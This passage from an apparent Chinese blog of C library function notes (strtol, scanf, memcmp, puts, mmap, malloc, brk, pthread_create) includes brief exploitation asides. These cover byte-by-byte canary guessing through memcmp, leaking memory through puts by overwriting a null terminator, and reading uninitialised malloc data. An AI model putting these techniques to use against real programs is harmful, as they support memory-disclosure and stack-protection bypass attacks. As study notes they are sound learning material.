<code>0x</code>  或 <code>0X</code>  开头，则视为十六进制；如果字符串以 <code>0</code>  开头，则视为八进制；否则视为十进制</li>\n</ul>\n<p>返回值：</p>\n<p>返回被转换的长整型数值，如果字符串不符合数字格式，则返回 0；若转换结果超出了 <code>long</code>  整数的表示范围，会产生 <code>溢出</code> ，并设置为 errno 为 ERANGE (可以使用 &lt; srrno.h&gt; 头文件中的 errno 变量来检查是否有溢出发生)</p>\n<p>如果输入字符串不能被完全转换为整数，strtol () 函数将返回转换成功的部分，而 <code> endptr</code>  将指向 <code>未转换</code> 部分的第一个字符。在这个例子中， <code>endptr </code> 是指向字符串 <code>末尾</code> 的 <code>空字符 '\\0'</code> ，表示 <code>整个</code> 输入字符串都被 <code>成功转换</code> 为整数。</p>\n<p>如果输入字符串包含 <code>非数字字符</code> ，例如 &quot;12ab&quot;，那么  <code>endptr</code>  将指向  <code>&quot;ab&quot;</code>  的起始位置，指示 <code>转换失败</code> 。</p>\n<h1 id=\"12scanf\"><a class=\"anchor\" href=\"#12scanf\">#</a> 12.scanf()</h1>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span> restrict format<span class=\"token punctuation\">,</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>作用：</p>\n<p>函数 scanf () 是从标准输入流 stdin [1] (标准输入设备，一般指向键盘) 中读内容的通用子程序，可以说明的格式读入多个字符，并保存在对应地址的变量中。<br />\n函数的第一个参数是格式字符串，它指定了输入的格式，并按照格式说明符解析输入对应位置的信息并存储于可变参数列表中对应的指针所指位置。每一个指针要求非空，并且与字符串中的格式符一一顺次对应。</p>\n<p>返回值：</p>\n<p>scanf 函数返回成功读入的数据项数，读入数据时遇到了 “文件结束” 则返回 EOF。</p>\n<p>format 指向的字符串包含的格式指令（只举例一个 s）：</p>\n<p>s 读入一个的字符序列，后面会加上 <code>空字节</code> ，遇到 <code>空白字符</code>  (\\t \\r \\n 空格等) 完成读取。</p>\n<p>% s 表示读字符串，而 % d 表示读整数。格式串的处理顺序为从左到右，格式说明符逐一与变元表中的变元匹配。</p>\n<p>格式命令可以说明最大域宽。 在百分号 (%) 与格式码之间的整数用于限制从对应域读入的最大字符数。例如，希望向 address 读入不多于 20 个字符时，可以书写成如下形式：</p>\n<pre><code>scanf(&quot;%20s&quot;,address);\n</code></pre>\n<p>如果输入流的内容 <code>多于</code>  20 个字符，则下次 scanf () 从 <code>此次停止处</code> 开始读入。 若达到最大域宽前已 <code>遇到空白符</code> ，则对该域的读 <code>立即停止</code> ；此时，scanf () 跳到下一个域。 <code>【这也就是意味着，当读入超过20个字符时，没有空白字符时会继续读入】</code></p>\n<h1 id=\"13memcmp函数\"><a class=\"anchor\" href=\"#13memcmp函数\">#</a> 13.memcmp 函数</h1>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">memcmp</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>str1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>str2<span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> n<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>作用：</p>\n<p>把存储区 str1 和存储区 str2 的前 n 个字节进行比较</p>\n<p>参数：</p>\n<ul>\n<li>str1 -- 指向内存块的指针</li>\n<li>str2 -- 指向内存块的指针</li>\n<li>n -- 要被比较的字节数</li>\n</ul>\n<p>返回值：</p>\n<ul>\n<li>如果返回值 &lt; 0，则表示 str1 小于 str2</li>\n<li>如果返回值 &gt; 0，则表示 str1 大于 str2</li>\n<li>如果返回值 = 0，则表示 str1 等于 str2</li>\n</ul>\n<p>c 语言非 0 即为真，因此必须相等才为假</p>\n<p><code>与strcmp不同，该函数在找到空字符后不会停止比较</code></p>\n<pre><code>比较s1和s2所指向对象的前n个字符，如果都相等，返回0，出现第一个不等的地方，如果s1指向的数大于s2指向的数，返回大于0的数，如果小于，返回小于0的数。\n\n对于这个库函数你是否表示费解，首先，有strcmp和strncmp库函数了，看到memcmp的函数声明是void*，我以为是可以比较任意类型的，比如int，float和double，那这个函数和strcnmp是不是重复了呢？\n\n二者都可以用于字符串的比较，但是二者是有比较大的差异的，因为strncmp是按照字节（byte-wise）比较的，并且比较的过程中会检查是否出现了&quot;\\0&quot;结束符，\n一旦任意一个字符串指针前进过程中遇到结束符，将终止比较。\n而memcmp函数是用于比较两个内存块的内容是否相等。\n如果要比较的对象中包含一些由于边界对齐需求而填入结构对象中的空格、联合 (union)结束的额外空格、字符串所分配的空间未使用完的部分引起的“holes”的话，最好使用memcmp来完成。\n这些“holes”(漏洞)的内容是不确定的，在执行byte-wise比较时结果也是不明确的。\n</code></pre>\n<p>memcmp 是可以比较 int，float，double</p>\n<p>这里的比较是从左往右开始的 <code>假设正确的Canary是0x12345678。您发送作为第一个字节。0x01memcmp会看到这个字节和Canary的第一个字节是匹配的，因此它会认为是正确的,发送0x01 0x23memcmp时会看到前两个字节都与Canary匹配，所以它仍然会认为它们是匹配的</code></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veWFuZ2d1YW5nLWl0L3AvNzIzNjg5Ni5odG1s\">https://www.cnblogs.com/yangguang-it/p/7236896.html</span></p>\n<h1 id=\"14-strcat函数\"><a class=\"anchor\" href=\"#14-strcat函数\">#</a> 14. strcat 函数</h1>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token function\">strcat</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>dest<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>src<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>作用：</p>\n<p>把 src 所指向的字符串 <code>追加</code> 到 dest 所指向的字符串的 <code>结尾</code></p>\n<p>返回值：</p>\n<p>该函数返回一个指向最终的目标字符串 dest 的指针</p>\n<h1 id=\"15puts函数\"><a class=\"anchor\" href=\"#15puts函数\">#</a> 15.puts 函数</h1>\n<p>puts 函数是 C 语言标准库中的一个函数，用于输出一个字符串并在结尾加上一个 <code>换行符（'\\n'）</code> 。</p>\n<p>当 puts 函数 <code>遇到</code> 字符串结尾的 <code>空字符（'\\0'）</code> 时，它会 <code>停止输出</code> ，因为空字符是 C 语言中字符串的结束标志， <code>意味着可以覆盖原本的空字符来泄露后面的内容</code></p>\n<h1 id=\"16strncmp函数\"><a class=\"anchor\" href=\"#16strncmp函数\">#</a> 16.strncmp 函数</h1>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">strncmp</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>str1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>str2<span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> n<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>作用：</p>\n<p>把 str1 和 str2 进行比较，最多比较前 n 个字符。</p>\n<p>strncmp () 函数通常用于比较两个字符串，以确定它们是否相等或哪个字符串在字典顺序上更小。</p>\n<p>参数：</p>\n<ul>\n<li>str1 -- 要进行比较的第一个字符串。</li>\n<li>str2 -- 要进行比较的第二个字符串。</li>\n<li>n -- 要比较的最大字符数。</li>\n</ul>\n<p>返回值：</p>\n<ul>\n<li>如果返回值 &lt; 0，则表示 str1 小于 str2。</li>\n<li>如果返回值 &gt; 0，则表示 str1 大于 str2。</li>\n<li>如果返回值 = 0，则表示 str1 等于 str2。</li>\n</ul>\n<h1 id=\"17mmap函数\"><a class=\"anchor\" href=\"#17mmap函数\">#</a> 17.mmap 函数</h1>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">mmap</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> start<span class=\"token punctuation\">,</span><span class=\"token class-name\">size_t</span> length<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> prot<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> flags<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> fd<span class=\"token punctuation\">,</span><span class=\"token class-name\">off_t</span> offset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">munmap</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token operator\">*</span> start<span class=\"token punctuation\">,</span><span class=\"token class-name\">size_t</span> length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>作用：</p>\n<p>mmap 函数将文件映射到进程地址空间，实现直接访问文件内容的功能 (mmap 函数通常用于在内存中分配一块连续的地址空间，并指定相应的权限和属性)</p>\n<p>mmap 将一个文件或者其它对象映射进内存。文件被映射到多个页上，如果文件的大小不是所有页的大小之和，最后一个页不被使用的空间将会清零。mmap 在用户空间映射调用系统中作用很大。</p>\n<p>mmap 必须以页大小为单位进行映射，而内存也只能以页为单位进行映射，若要映射非 PAGE_SIZE 整数倍的地址范围，要先进行内存对齐，强行以 PAGE_SIZE 的倍数大小进行映射</p>\n<p><s> <code>mmap</code>  函数，它开辟了一个可执行地址，返回值就是该地址</s></p>\n<h2 id=\"2\"><a class=\"anchor\" href=\"#2\">#</a> 2</h2>\n<p>mmap () 函数的主要用途有三个：</p>\n<p>1、将一个普通文件映射到内存中，通常在需要对文件进行频繁读写时使用，这样用内存读写取代 I/O 读写，以获得较高的性能；</p>\n<p>2、将特殊文件进行匿名内存映射，可以为关联进程提供共享内存空间；</p>\n<p>3、为无关联的进程提供共享内存空间，一般也是将一个普通文件映射到内存中。</p>\n<h2 id=\"补充\"><a class=\"anchor\" href=\"#补充\">#</a> 补充</h2>\n<p>【尽管通过 mmap 开辟的空间没有执行权限，但是有读写权限时，仍然可以在这执行 open，read，write 等对应权限的功能】</p>\n<p>open 打开文件时设置的权限（如读写权限 O_RDWR/O_RDONLY/O_WRONLY）必须要和 mmap 系统调用所需权限相匹配。</p>\n<p>具体来说，</p>\n<p>打开时，必须允许读取，即 O_RDONLY 和 O_RDWR 至少指定一个；<br />\nmmap 调用时，如果 prot 参数中指定了 PROT_WRITE，并且 flags 中指定了 MAP_SHARED，那么打开时，必须指定 O_RDWR。<br />\n注意：</p>\n<p>1）open 时，不是所有文件都支持 mmap，如管道文件。</p>\n<p>2）mmap 完成后，关闭 fd 并不会释放内存映射对应空间，需要专门调用 munmap。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZm9ydHVuZWx5L3AvMTYyMTIwMjcuaHRtbA==\">https://www.cnblogs.com/fortunely/p/16212027.html</span></p>\n<h2 id=\"参数\"><a class=\"anchor\" href=\"#参数\">#</a> 参数</h2>\n<p>参数 start</p>\n<pre><code>指向欲映射的内存起始地址，通常设为 NULL（0），代表让系统自动选定地址，映射成功后返回该地址。\n</code></pre>\n<p>参数 length</p>\n<pre><code>代表将文件中多大的部分映射到内存。\n</code></pre>\n<p>参数 prot</p>\n<pre><code>映射区域的保护方式。可以为以下几种方式的组合：\n\nPROT_EXEC 映射区域可被执行 //1\n\nPROT_READ 映射区域可被读取 //4\n\nPROT_WRITE 映射区域可被写入//2\n\nPROT_NONE 映射区域不能存取\n</code></pre>\n<p>参数 flags</p>\n<pre><code>影响映射区域的各种特性。在调用mmap()时必须要指定MAP_SHARED 或MAP_PRIVATE。\n\nMAP_FIXED 如果参数start所指的地址无法成功建立映射时，则放弃映射，不对地址做修正。通常不鼓励用此标志。\n\nMAP_SHARED对映射区域的写入数据会复制回文件内，而且允许其他映射该文件的进程共享。\n\nMAP_PRIVATE 对映射区域的写入操作会产生一个映射文件的复制，即私人的“写入时复制”（copy on write）对此区域作的任何修改都不会写回原来的文件内容。\n\nMAP_ANONYMOUS建立匿名映射。此时会忽略参数fd，不涉及文件，而且映射区域无法和其他进程共享。\n\nMAP_DENYWRITE只允许对映射区域的写入操作，其他对文件直接写入的操作将会被拒绝。\n\nMAP_LOCKED 将映射区域锁定住，这表示该区域不会被置换（swap）。\n</code></pre>\n<p>参数 fd</p>\n<pre><code>要映射到内存中的文件描述符。如果使用匿名内存映射时，即flags中设置了MAP_ANONYMOUS，fd设为-1。有些系统不支持匿名内存映射，则可以使用fopen打开/dev/zero文件，然后对该文件进行映射，可以同样达到匿名内存映射的效果。\n</code></pre>\n<p>参数 offset</p>\n<pre><code>文件映射的偏移量，通常设置为0，代表从文件最前方开始对应，offset必须是分页大小的整数倍。\n</code></pre>\n<p>返回值</p>\n<pre><code>若映射成功则返回映射区的内存起始地址，否则返回MAP_FAILED(－1)，错误原因存于errno 中。\n</code></pre>\n<p>错误代码</p>\n<pre><code>EBADF 参数fd不是有效的文件描述词\n\nEACCES 存取权限有误。如果是MAP_PRIVATE 情况下文件必须可读，使用\n\nMAP_SHARED则要有PROT_WRITE以及该文件要能写入。\n\nEINVAL 参数start、length 或offset有一个不合法。\n\nEAGAIN 文件被锁住，或是有太多内存被锁住。\n\nENOMEM 内存不足。\n</code></pre>\n<p>需要注意的是内核并不是实时同步映射区与文件的，相反内核很少主动去同步，除非我们调用了函数 msync 或者关闭映射区（关闭映射区的时候，也不是立即同步的）</p>\n<h1 id=\"18putchar函数\"><a class=\"anchor\" href=\"#18putchar函数\">#</a> 18.putchar 函数</h1>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">putchar</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token keyword\">char</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>作用：</p>\n<p>C 库函数 int putchar (int char) 把参数 char 指定的字符（一个无符号字符）写入到标准输出 stdout 中【在屏幕上输出 char 型字符】</p>\n<p>返回值：</p>\n<p>该函数以无符号 char 强制转换为 int 的形式返回写入的字符，如果发生错误则返回 EOF。</p>\n<h1 id=\"19memset函数\"><a class=\"anchor\" href=\"#19memset函数\">#</a> 19.memset 函数</h1>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token function\">memset</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>str<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> c<span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> n<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>作用：</p>\n<p>C 库函数 <code>void *memset(void *str, int c, size_t n)</code>  复制字符 c（一个无符号字符）到参数 str 所指向的字符串的 <code>前 n 个字符</code></p>\n<p>参数</p>\n<ul>\n<li>str -- 指向要填充的内存块。</li>\n<li>c -- 要被设置的值。该值以 int 形式传递，但是函数在填充内存块时是使用该值的无符号字符形式。</li>\n<li>n -- 要被设置为该值的字符数。</li>\n</ul>\n<p>返回值</p>\n<p>该值返回一个指向存储区 str 的指针。</p>\n<h1 id=\"20bzero函数\"><a class=\"anchor\" href=\"#20bzero函数\">#</a> 20.bzero () 函数</h1>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">bzero</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>s<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>作用：</p>\n<p>bzero 函数用来将内存块（s）的前 n 个字节清零【由于 bzero 不是标准库函数，所以可移植性不是很好，建议使用 memset 函数代替】</p>\n<p>返回值：无返回值</p>\n<h1 id=\"21malloc不清空内存值\"><a class=\"anchor\" href=\"#21malloc不清空内存值\">#</a> 21.malloc (不清空内存值)</h1>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> num_bytes<span class=\"token punctuation\">)</span>；</pre></td></tr></table></figure><p>参数：</p>\n<p><code>num_byte</code>  为要申请的空间大小</p>\n<p>作用：</p>\n<p>在内存的动态存储区中分配一块长度为 size 字节的 <code>连续</code> 区域，参数 size 为需要内存空间的长度，返回该区域的首地址（首地址指的是 data 域）</p>\n<p><code>函数malloc不能初始化所分配的内存空间</code> ，这意味着我们申请的空间里面的数据仍然保留着（也就是可以通过这种方式泄露里面的数据）</p>\n<h1 id=\"22calloc清空内存值\"><a class=\"anchor\" href=\"#22calloc清空内存值\">#</a> 22.calloc（清空内存值）</h1>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token function\">calloc</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span> n<span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> size<span class=\"token punctuation\">)</span>；</pre></td></tr></table></figure><p>参数：</p>\n<p>其比 malloc 函数多一个参数，比如如果他要申请 20 个 int 类型空间： <code>int *p = (int *)calloc(20, sizeof(int)）</code></p>\n<p>作用：</p>\n<p>与 malloc 相似，参数 <code>sizeof(int)</code>  为申请地址的单位元素长度， <code>size_t n</code>  为元素个数，即在内存中申请 <code>sizeof(int)*size_t n</code>  字节大小的连续地址空间</p>\n<p>malloc 申请后空间的值是原来申请前的，并没有进行初始化，而 calloc 却在申请后，对空间逐一进行 <code>初始化</code> ，并设置值为 0</p>\n<h1 id=\"23realloc改变已申请的空间的大小\"><a class=\"anchor\" href=\"#23realloc改变已申请的空间的大小\">#</a> 23.realloc (改变已申请的空间的大小)</h1>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">realloc</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>ptr<span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> new_Size<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>参数：</p>\n<p>ptr 为指向原来空间基址的指针， new_size 为接下来需要重新分配空间的大小</p>\n<p>作用：</p>\n<p>给一个已经分配了地址的指针重新分配空间，参数 ptr 为原有的空间地址，new_size 是重新申请的地址长度.</p>\n<p>用于对动态内存进行扩容 (及已申请的动态空间不够使用，需要进行空间扩容操作</p>\n<p>进一步分析：</p>\n<pre><code>   如果size较小，原来申请的动态内存后面还有空余内存，系统将直接在原内存空间后面扩容，并返回原动态空间基地址；如果size较大，原来申请的空间后面没有足够大的空间扩容，系统将重新申请一块&quot;原来的空间大小+新申请的空间大小&quot;的内存，并把原来空间的内容拷贝过去，原来空间free;如果size非常大，系统内存申请失败，返回NULL,原来的内存不会释放。注意：如果扩容后的内存空间较原空间小，将会出现数据丢失，如果直接realloc(p, 0);相当于free(p).\n</code></pre>\n<h1 id=\"24-brk与sbrk\"><a class=\"anchor\" href=\"#24-brk与sbrk\">#</a> 24 brk 与 sbrk</h1>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 函数原型：</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">brk</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span> addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span> <span class=\"token function\">sbrk</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">intptr_t</span> increment<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>brk () 和 sbrk () 改变 <code>程序间断点</code> 的位置 (申请内存空间的起始处)。程序间断点就是程序数据段的结尾。（程序间断点是为初始化数据段的起始位置）. 通过增加程序间断点进程可以更有效的申请内存 。当 addr 参数合理、系统有足够的内存并且不超过最大值时 brk () 函数将数据段结尾设置为 addr, 即间断点设置为 addr。sbrk () 将程序数据空间增加 <code>increment字节</code> 。当 <code>increment</code>  为 0 时则返回程序间断点的当前位置。</p>\n<p>也就说通过对间断点的设置来分配空间和回收内存，两个函数都能够改变间断点</p>\n<p>返回值：</p>\n<p>brk () 成功返回 0，失败返回 - 1 并且设置 errno 值为 ENOMEM（注：在 mmap 中会提到）。<br />\nsbrk () 成功返回之前的程序间断点地址。如果间断点值增加，那么这个指针（指的是返回的之前的间断点地址）是指向分配的新的内存的首地址。如果出错失败，就返回一个指针并设置 errno 全局变量的值为 ENOMEM。</p>\n<p>这两个函数都用来改变 “program break” (程序间断点) 的位置，改变数据段长度（Change data segment size），实现虚拟内存到物理内存的映射。<br />\nbrk () 函数直接修改有效访问范围的末尾地址实现分配与回收。sbrk () 参数函数中：当 increment 为正值时，间断点位置向后移动 increment 字节。同时返回移动之前的位置，相当于分配内存。当 increment 为负值时，位置向前移动 increment 字节，相当与于释放内存，其返回值没有实际意义。当 increment 为 0 时，不移动位置只返回当前位置。参数 increment 的符号决定了是分配还是回收内存</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3QuY3NkbmltZy5jbi9jSUdxWg==\">http://t.csdnimg.cn/cIGqZ</span></p>\n<h1 id=\"25fseek函数\"><a class=\"anchor\" href=\"#25fseek函数\">#</a> 25.fseek 函数（）</h1>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">fseek</span><span class=\"token punctuation\">(</span>FILE <span class=\"token operator\">*</span>stream<span class=\"token punctuation\">,</span> <span class=\"token keyword\">long</span> <span class=\"token keyword\">int</span> offset<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> whence<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>作用：</p>\n<p>C 库函数 int fseek (FILE *stream, long int offset, int whence) 设置流 stream 的文件位置为给定的偏移 offset，参数 offset 意味着从给定的 whence 位置查找的字节数【就是将指向文件具体位置的指针给修改位置使指向设定的偏移处】</p>\n<p>参数：</p>\n<ul>\n<li>stream -- 这是指向 FILE 对象的指针，该 FILE 对象标识了流。</li>\n<li>offset -- 这是相对 whence 的偏移量，以字节为单位。</li>\n<li>whence -- 这是表示开始添加偏移 offset 的位置。它一般指定为下列常量之一</li>\n</ul>\n<p>常量\t|    描述</p>\n<p>SEEK_SET\t|  文件的开头</p>\n<p>SEEK_CUR\t|  文件指针的当前位置</p>\n<p>SEEK_END\t|  文件的末尾</p>\n<p>返回值：</p>\n<p>如果成功，则该函数返回零，否则返回非零值。</p>\n<h1 id=\"26ftell函数\"><a class=\"anchor\" href=\"#26ftell函数\">#</a> 26.ftell 函数</h1>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">long</span> <span class=\"token keyword\">int</span> <span class=\"token function\">ftell</span><span class=\"token punctuation\">(</span>FILE <span class=\"token operator\">*</span>stream<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>作用：</p>\n<p>C 库函数 long int ftell (FILE *stream) 返回给定流 stream 的当前文件位置。【上面的 fseek 修改了位置，这里可以用来返回】</p>\n<p>参数：</p>\n<p>stream -- 这是指向 FILE 对象的指针，该 FILE 对象标识了流</p>\n<p>返回值：</p>\n<p>该函数返回位置标识符的当前值。如果发生错误，则返回 -1L，全局变量 errno 被设置为一个正值</p>\n<h1 id=\"27空类型void\"><a class=\"anchor\" href=\"#27空类型void\">#</a> 27. 空类型 (void)</h1>\n<p>通常用于以下三种情况</p>\n<ul>\n<li>函数返回空：函数不返回值，或者返回空，例如 void exit (int status);</li>\n<li>函数参数为空：函数不接受任何参数，不带参数的函数可以接受一个 void。例如 int rand (void);</li>\n<li>指针指向 void：类型为 void * 的指针代表 <code>对象的地址</code> ，而 <code>不是类型</code> 。例如，内存分配函数 void *malloc (size_t size); 返回指向 void 的指针，可以转换为任何数据类型。</li>\n</ul>\n<h1 id=\"28pthread_creat函数创建子线程\"><a class=\"anchor\" href=\"#28pthread_creat函数创建子线程\">#</a> 28.pthread_creat 函数（创建子线程）、</h1>\n<p>pthread_create () 函数用来创建线程</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">pthread_create</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">pthread_t</span> <span class=\"token operator\">*</span>thread<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>                   <span class=\"token keyword\">const</span> <span class=\"token class-name\">pthread_attr_t</span> <span class=\"token operator\">*</span>attr<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>                   <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>start_routine<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>                   <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>arg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>各个参数的含义是：</p>\n<ol>\n<li>\n<p><code>pthread_t *thread</code> ：传递一个  <code>pthread_t</code>  类型的指针变量，也可以直接传递某个  <code>pthread_t</code>  类型变量的地址。 <code>pthread_t</code>  是一种用于表示线程的数据类型，每一个  <code>pthread_t</code>  类型的变量都可以表示一个线程。</p>\n</li>\n<li>\n<p><code>const pthread_attr_t *attr：</code> 用于手动设置新建线程的属性，例如线程的调用策略、线程所能使用的栈内存的大小等。大部分场景中，我们都不需要手动修改线程的属性，将 attr 参数赋值为 <code> NULL</code> ， <code>pthread_create()</code>  函数会采用系统默认的属性值创建线程。</p>\n</li>\n</ol>\n<p><code>pthread_attr_t </code> 类型以结构体的形式定义在 &lt;pthread.h&gt; 头文件中，此类型的变量专门表示线程的属性。</p>\n<ol start=\"3\">\n<li>\n<p><code>void *(*start_routine) (void *)：</code> 以函数指针的方式指明新建线程需要执行的函数，该函数的参数最多有 1 个（可以省略不写），形参和返回值的类型都必须为 void* 类型。void* 类型又称空指针类型，表明指针所指数据的类型是未知的。使用此类型指针时，我们通常需要先对其进行强制类型转换，然后才能正常访问指针指向的数据。</p>\n<p>如果该函数有返回值，则线程执行完函数后，函数的返回值可以由 pthread_join () 函数接收。</p>\n</li>\n<li>\n<p><code>void *arg</code> ：指定传递给  <code>start_routine</code>  函数的实参，当不需要传递任何数据时，将  <code>arg</code>  赋值为  <code>NULL</code>  即可。</p>\n</li>\n</ol>\n<p>返回值：</p>\n<p>如果成功创建线程， <code>pthread_create()</code>  函数返回数字 0，反之返回非零值。各个非零值都对应着不同的宏，指明创建失败的原因，常见的宏有以下几种：</p>\n<ul>\n<li>EAGAIN：系统资源不足，无法提供创建线程所需的资源。</li>\n<li>EINVAL：传递给  <code>pthread_create(</code> ) 函数的 attr 参数无效。</li>\n<li>EPERM：传递给 <code> pthread_create()</code>  函数的 attr 参数中，某些属性的设置为非法操作，程序没有相关的设置权限</li>\n</ul>\n<p>以上这些宏都声明在 &lt;errno.h&gt; 头文件中，如果程序中想使用这些宏，需提前引入此头文件</p>\n<p>注意：</p>\n<p>pthread_create () 函数成功创建的线程会自动执行指定的函数，不需要手动开启。为了确保创建的线程能在主线程之前执行完，程序中可以调用 sleep () 函数延缓了主线程的执行速度。否则整个进程会随着主线程执行结束而立即终止：由于主线程执行太快，子线程可能尚未执行完就被强制终止</p>\n<p><span class=\"exturl\" 